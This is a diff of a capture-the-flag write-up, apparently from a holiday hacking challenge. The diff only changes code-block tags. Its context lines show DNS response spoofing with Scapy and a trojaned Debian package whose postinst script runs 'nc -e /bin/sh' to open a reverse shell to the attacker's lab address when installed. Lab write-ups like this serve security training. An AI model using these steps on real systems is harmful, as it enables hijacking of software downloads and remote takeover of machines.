@@ -60,7 +60,7 @@ It is also possible toget more details from the Scapy sniff – the DNS portion 
 ```
 
 Thanks to the hints I now know that I need to spoof a DNS response and have it point to my terminal.  For this I need to update the `dns_resp.py` script with the following parameters:
-```
+```python
 ipaddr_we_arp_spoofed = "10.6.6.53"
 eth = Ether(src="02:42:0a:06:00:02", dst="4c:24:57:ab:ed:84")
 ip=IP(dst="10.6.6.35", src="10.6.6.53")
@@ -92,7 +92,7 @@ We now see a number of new requests including http requests.
 We can use ``>>> hexdump(f[IP][12].load)`` to see the contents of individual packets.
 
 I now started up a http server as suggested by the HELP.md file:
-```
+```console
 ~$ python3 –m http.server 80
 ```
 
@@ -108,17 +108,17 @@ I created an empty file called `suriv_amd64.deb` and the `/pub/jfrost/backdoor/`
 OK – so all I need is to find some way to make the deb file open a reverse shell when it is installed on the compromised machine.  This is where [the link in one of the hints for this objective](http://www.wannescolman.be/?p=98) came in very handy.
 
 I took the Netcat debian file found in the `debs/` folder and de-packaged it to a temporary folder called `work/`: 
-```
+```console
 ~$ dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb work
 ```
 
 I created a directory called `DEBIAN` in work
-```
+```console
 ~$ mkdir work/DEBIAN
 ```
 
 I extracted the `control` and `postinst` files from the deb package and moved them to the `work/DEBIAN/` directory:
-```
+```console
 ~$ ar -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb
 ~$ tar -xf control.tar.xz ./control
 ~$ tar -xf control.tar.xz ./postinst
@@ -127,17 +127,17 @@ I extracted the `control` and `postinst` files from the deb package and moved th
 ```
 
 Now I added a line to the end of the `postinst` file to have it establish a Netcat reverse shell (We know that Netcat is installed if the deb has been run).
-```
+```console
 ~$ echo “nc -e /bin/sh 10.6.0.4 5555” >> work/DEBIAN/postinst
 ```
 
 And I re-package the deb file:
-```
+```console
 ~$ dpkg-deb --build work/
 ```
 
 Finally I moved the .deb file to the web server, renaming it to the file Jack Frost is looking for:
-```
+```console
 ~$ mv work.deb /home/guest/pub/jfrost/backdoor/suriv_amd64.deb
 ```
 
